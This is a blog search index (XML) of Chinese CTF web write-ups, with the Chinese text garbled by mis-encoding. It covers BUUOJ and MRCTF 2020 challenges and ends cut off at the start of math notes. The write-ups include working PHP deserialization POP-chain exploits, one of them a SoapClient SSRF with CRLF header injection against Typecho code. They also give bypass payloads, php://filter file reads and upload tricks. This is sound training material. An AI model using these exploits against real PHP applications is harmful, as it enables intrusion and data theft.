<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUOJ-webåˆ·é¢˜ï¼ˆå››ï¼‰</title>
      <link href="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="0x-01-PWNHUB-å…¬å¼€èµ›-2018-å‚»-fufu-çš„å·¥ä½œæ—¥"><a href="#0x-01-PWNHUB-å…¬å¼€èµ›-2018-å‚»-fufu-çš„å·¥ä½œæ—¥" class="headerlink" title="0x 01 [PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥"></a>0x 01 [PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥</h3><ul><li><p>è€ƒç‚¹</p><p>phpæ•°ç»„ç‰¹æ€§</p></li><li><p>è§£é¢˜æ­¥éª¤</p></li></ul><ol><li>é¢˜ç›®å­˜åœ¨æºä»£ç æ³„éœ²ï¼Œä¸‹è½½UploadFile.class.php.bak,å‘ç°ä½¿ç”¨çš„æ˜¯PHPå…æ‰©å±•åŠ å¯†æ ¹æ®è¿™ç¯‡æ–‡ç« ä»‹ç»<a href="https://blog.csdn.net/ababab12345/article/details/90169678ï¼Œä½¿ç”¨è§£å¯†å·¥å…·è§£å¯†ï¼Œåˆ†ææºä»£ç å®šä½åˆ°å…³é”®éƒ¨åˆ†å¦‚ä¸‹ï¼š" target="_blank" rel="noopener">https://blog.csdn.net/ababab12345/article/details/90169678ï¼Œä½¿ç”¨è§£å¯†å·¥å…·è§£å¯†ï¼Œåˆ†ææºä»£ç å®šä½åˆ°å…³é”®éƒ¨åˆ†å¦‚ä¸‹ï¼š</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if(!in_array($filename[count($filename)-1], $this-&gt;allow_ext)) &#123;</span><br><span class="line">        return $this-&gt;error(&#39;åªå…è®¸ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶&#39;);</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; ç”¨.åˆ†å‰²æ–‡ä»¶åï¼Œåªä¿ç•™é¦–å°¾ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œé˜²å¾¡Apacheè§£ææ¼æ´</span><br><span class="line">$origin_name &#x3D; current($filename);   &#x2F;&#x2F;è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ</span><br><span class="line">$ext &#x3D; end($filename);  &#x2F;&#x2F;å°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼ˆå¦‚æœæˆåŠŸï¼‰ã€‚</span><br><span class="line">$new_name &#x3D; ($this-&gt;new_name ? $this-&gt;new_name : $origin_name) . &#39;.&#39; . $ext;</span><br><span class="line">$target_fullpath &#x3D; $this-&gt;dist_path . DIRECTORY_SEPARATOR . $new_name;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­åç¼€åæ˜¯å¦åœ¨ç™½åå•ä¸­ä½¿ç”¨äº†<code>$filename[count($filename) - 1]</code>ï¼Œè€Œæœ€åå­—ç¬¦åˆæˆæ–‡ä»¶åçš„æ—¶å€™ä½¿ç”¨äº†<code>end($filename)</code>ã€‚ä¸¤è€…çš„åŒºåˆ«æ˜¯ï¼Œå‰è€…æ˜¯é€šè¿‡ä¸‹æ ‡æ¥ç¡®å®šï¼Œåè€…åˆ™æ˜¯è¿”å›æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ã€‚å¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡ï¼š</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200401221558883.png" alt></p><p>åœ¨è·Ÿç›®å½•å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUOJ </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTFå¤ç›˜é¢˜è§£</title>
      <link href="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/"/>
      <url>/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="0x-01-Ez-bypass"><a href="#0x-01-Ez-bypass" class="headerlink" title="0x 01 Ez_bypass"></a>0x 01 Ez_bypass</h4><p>ç¬¬ä¸€å±‚æ•°ç»„ç»•è¿‡ï¼Œç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡</p><h4 id="0x-02-ä½ ä¼ ä½ ğŸå‘¢"><a href="#0x-02-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="0x 02 ä½ ä¼ ä½ ğŸå‘¢"></a>0x 02 ä½ ä¼ ä½ ğŸå‘¢</h4><p>ä¸Šä¼ .htaccessç»•è¿‡</p><h4 id="0x-03-PYWebsite"><a href="#0x-03-PYWebsite" class="headerlink" title="0x 03 PYWebsite"></a>0x 03 PYWebsite</h4><p>XFFä¼ªé€ 127.0.0.1å¾—åˆ°flag</p><h4 id="0x-04-Ezpop"><a href="#0x-04-Ezpop" class="headerlink" title="0x 04 Ezpop"></a>0x 04 Ezpop</h4><ol><li><code>__wakeup()</code>æ–¹æ³•é€šè¿‡<code>preg_match()</code>å°†<code>$this-&gt;source</code>åšå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œå¦‚æœ<code>$this-&gt;source</code>æ˜¯<code>Show</code>ç±»ï¼Œå°±è°ƒç”¨äº†<code>__toString()</code>æ–¹æ³•ï¼›</li><li><code>__toString()</code>è®¿é—®äº†<code>str</code>çš„<code>source</code>å±æ€§ï¼Œ<code>str</code>æ˜¯<code>Test</code>ç±»ï¼Œä¸å­˜åœ¨<code>source</code>å±æ€§ï¼Œå°±è°ƒç”¨äº†<code>Test</code>ç±»çš„<code>__get()</code>é­”æœ¯æ–¹æ³•ï¼›</li><li><code>__get()</code>æ–¹æ³•å°†<code>p</code>ä½œä¸ºå‡½æ•°ä½¿ç”¨ï¼Œ<code>p</code>å®ä¾‹åŒ–ä¸º<code>Modify</code>ç±»ï¼Œå°±è°ƒç”¨äº†<code>Modifier</code>çš„<code>__invoke()</code>æ–¹æ³•ï¼›</li><li><code>__invoke()</code>è°ƒç”¨äº†<code>append()</code>æ–¹æ³•ï¼ŒåŒ…å«<code>$value</code>ï¼Œè‹¥å°†<code>$value</code>ä¸ºä¼ªåè®®ï¼Œåˆ™å¯è¯»flag.phpæºç </li></ol><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var &#x3D; &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)&#123;</span><br><span class="line">        $this-&gt;source &#x3D; $file;</span><br><span class="line">        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return &quot;aaa&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p &#x3D; new Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o &#x3D; new Show(&#39;aaa&#39;);</span><br><span class="line">$o-&gt;str&#x3D; new Test();</span><br><span class="line">$lxj &#x3D; new Show($o);</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($lxj));</span><br></pre></td></tr></table></figure><h4 id="0x-05-å¥—å¨ƒ"><a href="#0x-05-å¥—å¨ƒ" class="headerlink" title="0x 05 å¥—å¨ƒ"></a>0x 05 å¥—å¨ƒ</h4><ul><li>ç¬¬ä¸€å…³</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$query &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#39;_&#39;) !&#x3D;&#x3D; 0 || substr_count($query, &#39;%5f&#39;) !&#x3D; 0 )&#123;</span><br><span class="line">    die(&#39;Y0u are So cutE!&#39;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#39;b_u_p_t&#39;] !&#x3D;&#x3D; &#39;23333&#39; &amp;&amp; preg_match(&#39;&#x2F;^23333$&#x2F;&#39;, $_GET[&#39;b_u_p_t&#39;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚åŒ¹é…äº†<code>_</code>ç¬¦å·å’Œå®ƒçš„urlç¼–ç å€¼ï¼Œæœ‰å¦‚ä¸‹æ–¹æ³•ç»•è¿‡ï¼š</p><ol><li>%5F</li><li>b.u.p.tï¼ˆç‚¹ä»£æ›¿_ï¼‰</li><li>b u p tï¼ˆç©ºæ ¼ä»£æ›¿_ï¼‰</li></ol><p>ç¬¬äºŒå±‚æ¢è¡Œæ±¡æŸ“ç»•è¿‡ï¼Œæœ€ç»ˆpayloadï¼š?b.u.p.t=23333%0a</p><ul><li>ç¬¬äºŒå…³</li></ul><p>ä¼ªé€ æœ¬åœ°è®¿é—®å¾—åˆ°jsfuckæç¤º<code>post me Merak</code>ï¼Œpostä¸€ä¸ªMerakå‚æ•°å¾—åˆ°æºä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#39;takeip.php&#39;;</span><br><span class="line">ini_set(&#39;open_basedir&#39;,&#39;.&#39;); </span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;Merak&#39;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v &#x3D; base64_decode($v); </span><br><span class="line">    $re &#x3D; &#39;&#39;; </span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#39;Local access only!&#39;.&quot;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><code>file_get_contents()</code>ç”¨<code>data://</code>æˆ–è€…<code>php://input</code>ä¼ªåè®®ç»•è¿‡,æ ¹æ®åŠ å¯†è„šæœ¬å¯ä»¥ç¼–å†™å‡ºdechangeå‡½æ•°ï¼Œå¾—åˆ°<code>ZmpdYSZmXGI=</code>ï¼Œæœ€ç»ˆå‘åŒ…å¾—åˆ°flag</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200401230121454.png" alt></p><h4 id="0x-06-Ezaudit"><a href="#0x-06-Ezaudit" class="headerlink" title="0x 06 Ezaudit"></a>0x 06 Ezaudit</h4><p><a href="http://www.zipæºä»£ç æ³„éœ²ï¼Œé¢˜ç›®ç±»ä¼¼äºGWCTFæ¯ç‡¥çš„æŠ½å¥–ï¼Œæ ¹æ®åŸé¢˜çš„payloadè¿˜åŸå‡ºç§å­ï¼Œç„¶åæ‰‹å·¥æ¨ç®—å‡ºç§é’¥ï¼Œæœ€åSQLæ³¨å…¥å¾—åˆ°flag" target="_blank" rel="noopener">www.zipæºä»£ç æ³„éœ²ï¼Œé¢˜ç›®ç±»ä¼¼äºGWCTFæ¯ç‡¥çš„æŠ½å¥–ï¼Œæ ¹æ®åŸé¢˜çš„payloadè¿˜åŸå‡ºç§å­ï¼Œç„¶åæ‰‹å·¥æ¨ç®—å‡ºç§é’¥ï¼Œæœ€åSQLæ³¨å…¥å¾—åˆ°flag</a></p><h4 id="0x-07-Ezpop-Revenge"><a href="#0x-07-Ezpop-Revenge" class="headerlink" title="0x 07 Ezpop_Revenge"></a>0x 07 Ezpop_Revenge</h4><p>var/Typecho/Plugin.php</p><p>æ¿€æ´»æ’ä»¶æ–¹æ³•å¤„å¾—åˆ°ç»‘å®šçš„url</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223613501.png" alt></p><p>é¦–å…ˆæ ¹æ®é¢˜æ„å…¨å±€æœç´¢unserialize,è·¯å¾„ä¸ºusr/plugins/HelloWorld/Plugin.phpä¸­æ‰¾åˆ°ååºåˆ—åŒ–ç‚¹</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214718378.png" alt></p><p>é¦–å…ˆçœ‹åˆ°è¿™é‡Œï¼š</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402214946669.png" alt></p><p>æ‰¾åˆ°å…¥å£ç‚¹ï¼Œè·Ÿè¿›Typecho_Db::__construct</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215208957.png" alt></p><p>å­˜åœ¨å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå…¨å±€æœç´¢å¯»æ‰¾__tostring()é­”æœ¯æ–¹æ³•</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215545678.png" alt></p><p>æˆ‘ä»¬é€‰æ‹©var/Typecho/Db/Query.phpä½œä¸ºè·³æ¿</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402215659239.png" alt></p><p>å¦‚æœ$this-&gt;_sqlPreBuild[â€˜actionâ€™]=SELECTå°±è°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild)</span><br></pre></td></tr></table></figure><p>å¦‚æœä»¤$this-&gt;_adapterä¸ºSoapclientå®ä¾‹ï¼Œè§¦å‘_callå®Œæˆssrf</p><p>popé“¾æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HelloWorld_DB::wakeupâ€“&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)â€“&gt;</span><br><span class="line">Typecho_Db_Query::__constructâ€“&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)â€“&gt;</span><br><span class="line">__call()è¿›è¡Œssrf</span><br></pre></td></tr></table></figure><p>expæ„é€ å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class HelloWorld_DB&#123;</span><br><span class="line">    private $coincidence;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;coincidence&#x3D;([&#39;hello&#39;&#x3D;&gt;new Typecho_Db_Query()]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Typecho_Db_Query</span><br><span class="line">&#123;</span><br><span class="line">    private $_sqlPreBuild;</span><br><span class="line">    private $_adapter;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;_sqlPreBuild[&#39;action&#39;]&#x3D;&#39;SELECT&#39;;</span><br><span class="line">        $target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;</span><br><span class="line">        $headers &#x3D; array(</span><br><span class="line">            &#39;Cookie: PHPSESSID&#x3D;ubcj94u08mcaodg4g1e0nooam2&#39;,</span><br><span class="line">        );</span><br><span class="line">        $this-&gt;_adapter&#x3D;new SoapClient(</span><br><span class="line">            null,</span><br><span class="line">            array(&#39;location&#39; &#x3D;&gt; $target,</span><br><span class="line">                &#39;user_agent&#39;&#x3D;&gt;str_replace(&#39;^^&#39;, &quot;\r\n&quot;,&#39;w4nder^^Content-Type: application&#x2F;x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers)),&#39;uri&#39;&#x3D;&gt;&#39;hello&#39;));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; serialize(new HelloWorld_DB());</span><br><span class="line">echo base64_encode($a);</span><br></pre></td></tr></table></figure><p>è®¿é—®/page_admin?admin=1ï¼Œpostæäº¤base64ç¼–ç çš„ç»“æœå¾—åˆ°flag</p><ul><li>åè®°</li></ul><p>åœ¨å…¥å£å¤„å­˜åœ¨ä¸€åˆ™è¿‡æ»¤ï¼Œå…¶ä¸­è¿‡æ»¤äº†ç™¾åˆ†å·ï¼Œç”±äºç»è¿‡base64ç¼–ç ååœ¨è§£ç æ²¡æœ‰ç™¾åˆ†å·äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦ç»•è¿‡</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402223309609.png" alt></p><p>å‡è®¾æˆ‘ä»¬éœ€è¦ç»•è¿‡%åˆ†å·è¯¥å¦‚ä½•ç»•è¿‡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯éœ€è¦ç”¨\00æ¥ä»£æ›¿%00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ PHP5 æœ€æ–°çš„ CVS ä¸­ï¼Œ</span><br><span class="line">æ–°çš„åºåˆ—åŒ–æ–¹å¼å«åš escaped binary string æ–¹å¼ï¼Œè¿™æ˜¯ç›¸å¯¹ä¸æ™®é€šé‚£ç§ non-escaped binary string æ–¹å¼æ¥è¯´çš„ï¼š</span><br><span class="line">string å‹æ•°æ®ï¼ˆå­—ç¬¦ä¸²ï¼‰æ–°çš„åºåˆ—åŒ–æ ¼å¼ä¸ºï¼š</span><br><span class="line">S:&quot;&lt;length&gt;&quot;:&quot;&lt;value&gt;&quot;;</span><br><span class="line">å…¶ä¸­ &lt;length&gt; æ˜¯æºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œè€Œé &lt;value&gt; çš„é•¿åº¦ã€‚&lt;length&gt; æ˜¯éè´Ÿæ•´æ•°ï¼Œæ•°å­—å‰å¯ä»¥å¸¦æœ‰æ­£å·ï¼ˆ+ï¼‰ã€‚&lt;value&gt; ä¸ºç»è¿‡è½¬ä¹‰ä¹‹åçš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">å®ƒçš„è½¬ä¹‰ç¼–ç å¾ˆç®€å•ï¼Œå¯¹äº ASCII ç å°äº 128 çš„å­—ç¬¦ï¼ˆä½†ä¸åŒ…æ‹¬ \ï¼‰ï¼ŒæŒ‰ç…§å•ä¸ªå­—èŠ‚å†™å…¥ï¼ˆä¸ s æ ‡è¯†çš„ç›¸åŒï¼‰ï¼Œå¯¹äº 128~255 çš„å­—ç¬¦å’Œ \ å­—ç¬¦ï¼Œåˆ™å°†å…¶ ASCII ç å€¼è½¬åŒ–ä¸º 16 è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œä»¥ \ ä½œä¸ºå¼€å¤´ï¼Œåé¢ä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«æ˜¯è¿™ä¸ªå­—ç¬¦çš„ 16 è¿›åˆ¶ç¼–ç ï¼Œé¡ºåºæŒ‰ç…§ç”±é«˜ä½åˆ°ä½ä½æ’åˆ—ï¼Œä¹Ÿå°±æ˜¯ç¬¬ 8-5 ä½æ‰€å¯¹åº”çš„16è¿›åˆ¶æ•°å­—å­—ç¬¦ï¼ˆabcdef è¿™å‡ ä¸ªå­—æ¯æ˜¯å°å†™ï¼‰ä½œä¸ºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼Œç¬¬ 4-1 ä½ä½œä¸ºç¬¬äºŒä¸ªå­—èŠ‚ã€‚ä¾æ¬¡ç¼–ç ä¸‹æ¥ï¼Œå¾—åˆ°çš„å°±æ˜¯ &lt;value&gt; çš„å†…å®¹äº†ã€‚</span><br></pre></td></tr></table></figure><p>æ™®é€šçš„åºåˆ—åŒ–å°så¯¹åº”çš„å°±æ˜¯æ™®é€šçš„å­—ç¬¦ä¸²ï¼Œå¦‚s:3:â€%00a%00â€;<br> è€Œåºåˆ—åŒ–çš„å¤§Såˆ™å¯¹åº”çš„æ˜¯\åŠ ä¸Š16è¿›åˆ¶ï¼Œå¦‚S:2:â€\00a\00â€ã€‚</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225703750.png" alt></p><p>å°†ä¸å¯è§å­—ç¬¦%00è½¬åŒ–ä¸ºåå…­è¿›åˆ¶ï¼Œå¤§SæˆåŠŸæ‰§è¡Œwakeup</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402230042727.png" alt></p><p>å°å†™såˆ™å¤±è´¥</p><p><img src="/2020/03/31/MRCTF%E5%A4%8D%E7%9B%98%E9%A2%98%E8%A7%A3/image-20200402225923011.png" alt></p><p>è½¬æ¢è„šæœ¬ï¼Œå‚è€ƒé¢–å¥‡å¸ˆå‚…çš„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function decorate($str)</span><br><span class="line">&#123;</span><br><span class="line">    $arr &#x3D; explode(&#39;:&#39;, $str);</span><br><span class="line">    $newstr &#x3D; &#39;&#39;;</span><br><span class="line">    for ($i &#x3D; 0; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;00&#x2F;&#39;, $arr[$i])) &#123;</span><br><span class="line">            $arr[$i-2] &#x3D; preg_replace(&#39;&#x2F;s&#x2F;&#39;, &quot;S&quot;, $arr[$i-2]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $i &#x3D; 0;</span><br><span class="line">    for (; $i &lt; count($arr) - 1; $i++) &#123;</span><br><span class="line">        $newstr .&#x3D; $arr[$i];</span><br><span class="line">        $newstr .&#x3D; &quot;:&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $newstr .&#x3D; $arr[$i];</span><br><span class="line">    return $newstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒèµ„æ–™ï¼š</p><blockquote><p><a href="https://blog.csdn.net/chasingin/article/details/105189436" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/105189436</a></p><p><a href="https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#Ezpop_Revenge</a></p><p><a href="https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctfwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MRCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€å­¦ä¹ ç¬”è®°</title>
      <link href="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="ç¬¬ä¸€ç« -æ•´æ•°çš„å¯é™¤æ€§"><a href="#ç¬¬ä¸€ç« -æ•´æ•°çš„å¯é™¤æ€§" class="headerlink" title="ç¬¬ä¸€ç«  æ•´æ•°çš„å¯é™¤æ€§"></a>ç¬¬ä¸€ç«  æ•´æ•°çš„å¯é™¤æ€§</h3><h4 id="0x-01-å¹¿ä¹‰æ¬§å‡ é‡Œå¾—é™¤æ³•-æ±‚æœ€å¤§å…¬å› æ•°"><a href="#0x-01-å¹¿ä¹‰æ¬§å‡ é‡Œå¾—é™¤æ³•-æ±‚æœ€å¤§å…¬å› æ•°" class="headerlink" title="0x  01 å¹¿ä¹‰æ¬§å‡ é‡Œå¾—é™¤æ³• æ±‚æœ€å¤§å…¬å› æ•°"></a>0x  01 å¹¿ä¹‰æ¬§å‡ é‡Œå¾—é™¤æ³• æ±‚æœ€å¤§å…¬å› æ•°</h4><ul><li>åŸºç¡€å®šç†</li></ul><p><img src="/2020/03/27/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200331224130106.png" alt></p><ul><li>å®ç°è¿‡ç¨‹</li></ul><p><img 